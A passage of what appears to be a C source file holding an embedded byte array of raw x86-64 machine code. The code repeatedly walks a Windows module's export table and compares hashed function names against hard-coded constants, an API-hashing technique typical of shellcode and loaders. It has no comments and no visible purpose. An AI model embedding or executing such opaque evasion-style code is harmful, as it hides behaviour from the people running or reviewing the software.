	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x82, 0xA4,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xED, 0x14, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x39, 0x9A, 0x04, 0x8E, 0xEE, 0x28,
	0x63, 0x30, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x38, 0xA4, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x14,
	0xA4, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xCD, 0x4F, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x06, 0xA4, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xFF, 0xA3, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xEA, 0xA3, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xC3, 0xA3, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xA9,
	0xA3, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x8F, 0xA3, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x75, 0xA3, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x32, 0xA3,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x9D, 0x13, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xEF, 0x86, 0x79, 0x89, 0x1E, 0x6D,
	0xE3, 0x30, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xE8, 0xA2, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xC4,
	0xA2, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x7D, 0x4E, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xB6, 0xA2, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xAF, 0xA2, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x9A, 0xA2, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x73, 0xA2, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x59,
	0xA2, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x3F, 0xA2, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x25, 0xA2, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xE2, 0xA1,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x4D, 0x12, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x48, 0xE0, 0xA0, 0xC8, 0x75, 0xD1,
	0x3B, 0x32, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x98, 0xA1, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x74,
	0xA1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x2D, 0x4D, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x66, 0xA1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x5F, 0xA1, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x4A, 0xA1, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x23, 0xA1, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x09,
	0xA1, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xEF, 0xA0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xD5, 0xA0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x92, 0xA0,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xFD, 0x10, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xB8, 0xC0, 0x7D, 0x50, 0x22, 0x48,
	0x4B, 0x3B, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x48, 0xA0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x24,
	0xA0, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xDD, 0x4B, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x16, 0xA0, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x0F, 0xA0, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xFA, 0x9F, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xD3, 0x9F, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xB9,
	0x9F, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x9F, 0x9F, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x85, 0x9F, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x42, 0x9F,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xAD, 0x0F, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xD8, 0x15, 0x6A, 0x82, 0x50, 0x56,
	0x7C, 0x3E, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xF8, 0x9E, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xD4,
	0x9E, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x8D, 0x4A, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xC6, 0x9E, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xBF, 0x9E, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xAA, 0x9E, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x83, 0x9E, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x69,
	0x9E, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x4F, 0x9E, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x35, 0x9E, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xF2, 0x9D,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x5D, 0x0E, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xC0, 0x56, 0x89, 0x28, 0x0E, 0xCA,
	0xE1, 0x47, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xA8, 0x9D, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x84,
	0x9D, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x3D, 0x49, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x76, 0x9D, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x6F, 0x9D, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x5A, 0x9D, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x33, 0x9D, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x19,
	0x9D, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xFF, 0x9C, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xE5, 0x9C, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xA2, 0x9C,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x0D, 0x0D, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x75, 0xD4, 0xFD, 0x81, 0x7D, 0x61,
	0xB8, 0x48, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x58, 0x9C, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x34,
	0x9C, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xED, 0x47, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x26, 0x9C, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x1F, 0x9C, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x0A, 0x9C, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xE3, 0x9B, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xC9,
	0x9B, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xAF, 0x9B, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x95, 0x9B, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x52, 0x9B,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xBD, 0x0B, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x9F, 0xD3, 0x16, 0x7F, 0x9F, 0x1A,
	0x31, 0x64, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x08, 0x9B, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xE4,
	0x9A, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x9D, 0x46, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xD6, 0x9A, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xCF, 0x9A, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xBA, 0x9A, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x93, 0x9A, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x79,
	0x9A, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x5F, 0x9A, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x45, 0x9A, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x02, 0x9A,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
